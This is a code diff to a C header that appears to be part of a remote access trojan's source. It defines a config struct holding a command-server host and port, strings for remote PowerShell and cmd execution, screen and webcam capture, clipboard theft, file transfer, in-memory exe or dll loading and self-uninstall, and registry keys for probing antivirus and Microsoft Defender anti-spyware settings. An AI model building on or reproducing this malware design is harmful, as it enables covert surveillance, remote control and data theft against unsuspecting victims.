@@ -42,11 +42,66 @@ unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, cons
 void get_formatted_time(unsigned long long secs, char* out_buf);
 
 // Config
-extern char g_host[256];
-extern int g_port;
-void load_config_from_resource();
+typedef struct {
+    char host[256];
+    int port;
 
-// Obfuscation
-const char* x(const unsigned char* data, int len, unsigned char key);
+    // Command Strings
+    char s_ping[16];
+    char s_pong[16];
+    char s_msg[16];
+    char s_exec_ps[16];
+    char s_exec_cmd[16];
+    char s_ps_out[32];
+    char s_cmd_out[32];
+    char s_scr_stop[32];
+    char s_cam_stop[32];
+    char s_tasklist[32];
+    char s_taskkill[32];
+    char s_ls[16];
+    char s_ls_res[32];
+    char s_download[32];
+    char s_delete[16];
+    char s_mkdir[16];
+    char s_upload[16];
+    char s_rename[16];
+    char s_rfe_exe[16];
+    char s_rfe_dll[16];
+    char s_browser[32];
+    char s_clip_get[32];
+    char s_clip_set[32];
+    char s_uninstall[16];
+    char s_close[16];
+    char s_reconnect[16];
+    char s_set_delay[16];
+    char s_scr_start[32];
+    char s_cam_start[32];
+    char s_sysinfo[32];
+    char s_response[16];
+    char s_command[16];
+    char s_session[16];
+
+    // Registry & System Strings
+    char s_reg_win_key[128];
+    char s_reg_prod_name[32];
+    char s_reg_build[32];
+    char s_reg_display[32];
+    char s_reg_release[32];
+    char s_reg_av_key[64];
+    char s_reg_defender_key[128];
+    char s_reg_dis_spy[32];
+    char s_reg_gpu_key[128];
+    char s_reg_gpu_desc[32];
+    char s_reg_cpu_key[128];
+    char s_reg_cpu_name[32];
+
+    // HTTP/IP Strings
+    char s_http_ua[32];
+    char s_http_host[32];
+    char s_http_path[32];
+} Config;
+
+extern Config g_conf;
+void load_config_from_resource();
 
 #endif
